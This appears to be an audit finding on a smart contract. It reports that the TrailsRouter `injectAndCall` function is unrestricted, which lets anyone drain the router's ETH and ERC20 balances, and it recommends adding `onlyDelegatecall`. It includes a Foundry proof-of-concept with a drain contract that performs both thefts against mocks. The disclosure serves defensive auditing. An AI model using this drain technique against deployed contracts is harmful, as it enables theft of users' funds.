  "body": "## Finding description and impact\n\nThe `injectAndCall` function is public and not restricted by `onlyDelegatecall`, despite being designed for delegatecall usage. It reads `callerBalance = _getSelfBalance(token)`, then:\n- For ETH: calls `target.call{value: callerBalance}(callData)`, sending the router’s entire ETH balance to `target`.\n- For ERC20: does `SafeERC20.forceApprove(token, target, callerBalance)` and then `target.call(callData)`, enabling `target` to `transferFrom(router, ...)` up to the router’s entire token balance.\n\nAnyone can call `injectAndCall` directly and:\n- For ETH: set `target = attackerEOA` (or any contract able to receive ETH) and drain all ETH held by the router.\n- For ERC20: set `target = attackerContract` that, upon being called, executes `transferFrom(router, attacker, balance)` using the freshly granted allowance.\n\nThus, any ETH or ERC20s held by the router can be stolen by any external caller through `injectAndCall`, without authorization.\n\n## Recommended mitigation steps\n\nAdd `onlyDelegatecall` to the function signature",
  "proof_of_concept": "```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.30;\n\nimport {Test} from \"forge-std/Test.sol\";\nimport {TrailsRouter} from \"src/TrailsRouter.sol\";\nimport {MockERC20} from \"test/mocks/MockERC20.sol\";\nimport {IERC20} from \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\n\ncontract ERC20DrainTarget {\n    function drainAll(address token, address to) external {\n        uint256 bal = IERC20(token).balanceOf(msg.sender);\n        require(IERC20(token).transferFrom(msg.sender, to, bal), \"transferFrom failed\");\n    }\n\n    receive() external payable {}\n}\n\ncontract TrailsRouterInjectAndCallPublicDrainPoC is Test {\n    TrailsRouter internal router;\n    MockERC20 internal token;\n    ERC20DrainTarget internal drainTarget;\n    address payable internal thief;\n\n    function setUp() public {\n        router = new TrailsRouter();\n        token = new MockERC20(\"Mock\", \"MCK\", 18);\n        drainTarget = new ERC20DrainTarget();\n        thief = payable(makeAddr(\"thief\"));\n    }\n\n    function test_PoC_injectAndCall_public_drain_ETH() public {\n        // Arrange: Fund router with ETH (stranded balance on router)\n        vm.deal(address(this), 2 ether);\n        (bool ok,) = address(router).call{value: 1 ether}(\"\");\n        require(ok, \"fund router failed\");\n        assertEq(address(router).balance, 1 ether);\n\n        // Act: Anyone can drain router ETH via public injectAndCall to an arbitrary target (EOA)\n        uint256 thiefBefore = thief.balance;\n        router.injectAndCall(address(0), thief, \"\", 0, bytes32(0));\n\n        // Assert: Router drained, thief received ETH\n        assertEq(address(router).balance, 0, \"router eth not drained\");\n        assertEq(thief.balance - thiefBefore, 1 ether, \"thief did not receive eth\");\n    }\n\n    function test_PoC_injectAndCall_public_drain_ERC20() public {\n        // Arrange: Router holds ERC20 (stranded balance on router)\n        uint256 amount = 1_000e18;\n        token.mint(address(router), amount);\n        assertEq(token.balanceOf(address(router)), amount);\n\n        // Act: Anyone can force-approve target, then target drains router via transferFrom\n        router.injectAndCall(\n            address(token),\n            address(drainTarget),\n            abi.encodeWithSelector(drainTarget.drainAll.selector, address(token), thief),\n            0,\n            bytes32(0)\n        );\n\n        // Assert: Router drained, thief received tokens\n        assertEq(token.balanceOf(address(router)), 0, \"router token not drained\");\n        assertEq(token.balanceOf(thief), amount, \"thief did not receive tokens\");\n    }\n}\n```",
